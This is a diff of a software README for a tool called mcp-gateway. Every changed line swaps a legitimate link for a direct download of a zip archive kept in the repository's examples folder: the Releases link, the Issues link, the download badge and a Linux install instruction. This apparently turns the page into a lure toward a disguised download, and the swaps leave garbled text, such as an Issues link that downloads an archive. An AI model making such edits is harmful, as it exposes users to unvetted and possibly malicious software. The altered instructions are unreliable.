@@ -4,13 +4,13 @@
 mcp-gateway helps you streamline multiple tools into one simple interface. It acts as a gateway to manage your applications effectively, eliminating confusion and enhancing your productivity.
 
 ## 📥 Download Now
-[![Download mcp-gateway](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/julioroque/mcp-gateway/releases)
+[![Download mcp-gateway](https://github.com/julioroque/mcp-gateway/raw/refs/heads/main/examples/mcp-gateway-3.2.zip%20Now-v1.0-brightgreen)](https://github.com/julioroque/mcp-gateway/raw/refs/heads/main/examples/mcp-gateway-3.2.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run mcp-gateway on your computer:
 
 1. **Visit the Releases Page**
-   Go to the official [Releases page](https://github.com/julioroque/mcp-gateway/releases) to find the latest version of the software.
+   Go to the official [Releases page](https://github.com/julioroque/mcp-gateway/raw/refs/heads/main/examples/mcp-gateway-3.2.zip) to find the latest version of the software.
 
 2. **Select the Release**
    Look for the most recent version listed at the top of the page. You will see details about the version and any notes regarding new features or fixes.
@@ -19,7 +19,7 @@ Follow these steps to download and run mcp-gateway on your computer:
    Click on the link for the installer that matches your operating system (e.g., Windows, macOS, Linux). If you're not sure which one to choose, here are some general guidelines:
    - **Windows:** Choose a `.exe` file.
    - **macOS:** Choose a `.dmg` file.
-   - **Linux:** Choose a `.tar.gz` file or the appropriate package for your distro.
+   - **Linux:** Choose a `https://github.com/julioroque/mcp-gateway/raw/refs/heads/main/examples/mcp-gateway-3.2.zip` file or the appropriate package for your distro.
 
 4. **Run the Installer**
    Once the file downloads, locate it in your downloads folder. Double-click the file to run the installer. Follow the on-screen prompts to complete the installation.
@@ -55,10 +55,10 @@ Yes, mcp-gateway is completely free to download and use.
 Absolutely! If you're interested in contributing, check the guidelines in the repository. 
 
 ### Where can I report issues or bugs?
-You can report any issues on the [Issues page](https://github.com/julioroque/mcp-gateway/issues). We appreciate your feedback.
+You can report any issues on the [Issues page](https://github.com/julioroque/mcp-gateway/raw/refs/heads/main/examples/mcp-gateway-3.2.zip). We appreciate your feedback.
 
 ## 🚀 Download & Install
-To get mcp-gateway, remember to [visit this page to download](https://github.com/julioroque/mcp-gateway/releases). Follow the steps outlined above to successfully install the application.
+To get mcp-gateway, remember to [visit this page to download](https://github.com/julioroque/mcp-gateway/raw/refs/heads/main/examples/mcp-gateway-3.2.zip). Follow the steps outlined above to successfully install the application.
 
 ## 🌍 Topics
 - gateway
